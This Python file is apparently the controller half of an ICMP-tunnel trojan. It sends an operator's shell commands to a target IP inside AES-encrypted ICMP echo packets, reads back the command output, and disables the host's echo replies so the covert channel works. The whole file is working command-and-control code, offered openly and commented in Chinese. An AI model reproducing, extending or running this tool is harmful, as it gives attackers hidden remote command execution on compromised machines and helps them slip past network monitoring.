#encoding=utf-8
#作者：@破壳雏鸟
#项目地址：https://github.com/pkcn445
#参考资料：https://www.bbsmax.com/A/KE5QjaE4dL/

from base64 import b64decode
from os import name, system
from time import sleep
from re import findall
from random import randint
from Crypto.Cipher import AES
from binascii import a2b_hex, b2a_hex
from json import dumps, loads
from socket import socket,AF_INET,IPPROTO_ICMP,IPPROTO_IP,IP_HDRINCL,SOCK_RAW, getprotobyname
from struct import pack
from settings import *
import sys

class DataAesCrypt:

    def __init__(self,keys:str,data:str) -> None:
        self.keys = keys.encode("utf-8")
        self.data = data 

    def encrypt(self):
        text = self.data + (16 - (len(self.data) % 16)) * "*"
        aes = AES.new(self.keys, AES.MODE_ECB) 
        en_text = b2a_hex(aes.encrypt(text.encode("utf-8"))) 
        return en_text.decode("utf-8")
    
    def decrypt(self):
        aes = AES.new(self.keys, AES.MODE_ECB)
        text = aes.decrypt(a2b_hex(self.data.encode("utf-8")))
        return text.decode("utf-8").split("*")[0]

def checksum(packet):
    """
    校验
    """
   #packet为icmp头部和data的字节流，其中icmp校验和字段初始化为0    
    sum =0
   #countTo:记录packet是有多少个16位，因为对每两个字节进行校验
    countTo = (len(packet)//2)*2 
    count =0

    while count <countTo:
        #将每两个字节中的第二个字节作为高位，第一个字节作为低位组成16位的值
        sum += ((packet[count+1] << 8) | packet[count])
        count += 2

    #packet并不一定都是偶数字节，可能是奇数，把最后一个字节加到sum中

    if countTo<len(packet):
        sum += packet[len(packet) - 1]
        sum = sum & 0xffffffff

    #sum中超过16位的高位加到低位
    sum = (sum >> 16)  +  (sum & 0xffff)
    sum = sum + (sum >> 16)

    #对sum取反
    answer = ~sum

    #到这应该就结束了，但是字节序有问题，下面是将主机字节序转为网络字节序
    #即高位转低位，低位转高位
    answer = answer & 0xffff
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer

def send_data(re_data,ip):
    re_data = DataAesCrypt(AES_KEY,re_data).encrypt()
    data = "pkcn-"+re_data+"-pkcn"
    b = data.encode("utf-8")
    seq = randint(1,256)
    rawsocket = socket(AF_INET,SOCK_RAW,getprotobyname("icmp"))
    packet = pack("!BBHHH0"+str(len(b))+"s",8,0,0,1,seq,b)
    chksum = checksum(packet)
    packet = pack("!BBHHH0"+str(len(b))+"s",8,0,chksum,1,seq,b)
    rawsocket.sendto(packet,(ip,0))
def recv_data(s_data,ip):
    data_get = ""
    while True:
        pkt= rawSocket.recvfrom(2048)
        print(pkt)
        if pkt[1][0] == ip:
            data = findall("pkcn-(.*?)-pkcn",str(pkt[0]))[0]
            print(data)
            data = DataAesCrypt(AES_KEY,data).decrypt()
            if data and data != s_data:
                data = loads(b64decode(data).decode())
                if data.get("sum") - data.get("send_size") == 0:
                    data_get += data.get("data")
                    print("\n命令执行结果：\n"+data_get+"\n")
                    break
                else:
                    data_get += data.get("data")
if __name__ == "__main__":
    ip = sys.argv[1]

    rawSocket = socket(AF_INET,SOCK_RAW,IPPROTO_ICMP)
    #通过setsockopt函数来设置数据保护IP头部,IP头部我们就可以接收到
    rawSocket.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
    if ip:
        if name == "nt":
            print("请使用Linux运行客户端，最好是 kali !!!")
            sys.exit(-1)
        else:
            isok = system("sysctl -w net.ipv4.icmp_echo_ignore_all=1")
            if isok != 0:
                print("关闭icmp回显失败！请手动关闭系统的icmp回显，否则木马的通讯会受到影响!!!")
        print("可以开始执行你的命令了,如果期间出现太久的卡顿可能是无法获取到木马数据！\n")
        while 1:
            cmd = input(">>>")
            if cmd:
                if cmd == "exit":
                    print("退出！")
                    break
                s_data = dumps({"cdm":cmd})
                send_data(s_data,ip)
                sleep(0.5)
                recv_data(s_data,ip)
    else:
        print("python3 client.py 目标IP地址")